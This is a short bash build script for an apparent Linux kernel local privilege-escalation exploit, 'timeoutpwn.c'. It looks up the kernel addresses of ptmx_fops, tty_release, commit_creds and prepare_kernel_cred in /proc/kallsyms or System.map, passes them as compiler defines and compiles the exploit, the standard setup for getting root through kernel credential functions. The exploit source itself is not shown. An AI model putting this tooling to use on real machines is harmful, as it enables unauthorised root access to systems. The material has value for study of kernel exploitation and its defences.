#!/bin/bash

symsfile=${1-/proc/kallsyms}

find_addr() {
    addr=$(awk -vsym=$1 '$NF == sym { print $1 }' < "$symsfile")
    if [ -z "$addr" ]; then
        echo "$1: address not found"
        exit 1
    fi

    if [[ $((0x$addr)) == 0 ]]; then
        echo "Invalid address, try grabbing System.map"
        exit 1
    fi

    CFLAGS="$CFLAGS -D${1^^}=0x${addr}LL"
}

# Note: newer kernels may miss this in /proc/kallsyms, try System.map instead
find_addr ptmx_fops

find_addr tty_release
find_addr commit_creds
find_addr prepare_kernel_cred

set -x
${CC-cc} timeoutpwn.c -o timeoutpwn $CFLAGS
